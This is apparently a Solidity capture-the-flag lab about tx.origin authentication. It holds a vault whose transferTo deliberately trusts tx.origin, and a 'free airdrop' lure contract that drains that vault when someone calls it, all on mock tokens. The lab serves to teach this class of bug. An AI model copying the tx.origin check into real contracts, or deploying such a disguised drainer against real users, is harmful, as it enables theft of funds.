// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {SolvableBase} from "@common/SolvableBase.sol";

/// @notice Public-mint mock ERC-20 — the lab mints the seed balance into
///         each vault. No faucet rate limit; tutorial only.
contract Q12MockToken is ERC20 {
    constructor() ERC20("VaultToken", "TKN") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Personal vault whose `transferTo` checks `tx.origin == owner`
///         instead of `msg.sender == owner`.
contract Q12TxOriginVault {
    address public immutable owner;
    Q12MockToken public immutable token;

    constructor(address o, Q12MockToken t) {
        owner = o;
        token = t;
    }

    function transferTo(address to, uint256 amount) external {
        // BUG: tx.origin authentication. Trusts the originating EOA
        //      regardless of which contract is actually calling.
        require(tx.origin == owner, "not owner");
        token.transfer(to, amount);
    }
}

/// @notice A "free airdrop" lure. Calling its only function looks
///         harmless, but internally interacts with the target vault using
///         the caller's tx.origin as authorization.
contract Q12Phisher {
    Q12TxOriginVault public immutable vault;
    Q12MockToken public immutable token;
    address public immutable beneficiary;
    bool public airdropClaimed;

    /// @param v Target vault.
    /// @param b Beneficiary used by the lab scenario.
    constructor(Q12TxOriginVault v, address b) {
        vault = v;
        token = v.token();
        beneficiary = b;
    }

    /// @notice The lure. Looks like a freebie; under the hood it calls into
    ///         the vault's tx.origin-gated path.
    function claimFreeAirdrop() external {
        airdropClaimed = true;
        vault.transferTo(beneficiary, token.balanceOf(address(vault)));
    }
}

/// @notice Multi-tenant tx.origin lab. Each user calls `createInstance()`
///         once; the lab deploys a fresh (token, vault, phisher) triple owned
///         by them and seeds the vault with `SEED` mock tokens.
///
///         Deploying costs only gas — the lab MINTS the seed tokens, it does
///         not need to hold any ETH.
contract Q12TxOriginLab is SolvableBase {
    uint256 public constant SEED = 5e18; // 5 TKN (18 decimals)

    struct Instance {
        Q12TxOriginVault vault;
        Q12Phisher phisher;
    }

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address vault, address phisher, address token);

    function createInstance() external returns (address vault, address phisher) {
        require(address(_instances[msg.sender].vault) == address(0), "already created");

        Q12MockToken t = new Q12MockToken();
        Q12TxOriginVault v = new Q12TxOriginVault(msg.sender, t);
        t.mint(address(v), SEED);
        Q12Phisher p = new Q12Phisher(v, msg.sender);

        _instances[msg.sender] = Instance(v, p);
        emit InstanceCreated(msg.sender, address(v), address(p), address(t));
        return (address(v), address(p));
    }

    function vaultOf(address user) external view returns (Q12TxOriginVault) {
        return _instances[user].vault;
    }

    function phisherOf(address user) external view returns (Q12Phisher) {
        return _instances[user].phisher;
    }

    function tokenOf(address user) external view returns (Q12MockToken) {
        Q12TxOriginVault v = _instances[user].vault;
        if (address(v) == address(0)) return Q12MockToken(address(0));
        return v.token();
    }

    function isSolved(address user) public view override returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.vault) == address(0)) return false;
        return inst.vault.token().balanceOf(address(inst.vault)) == 0 && inst.phisher.airdropClaimed();
    }
}
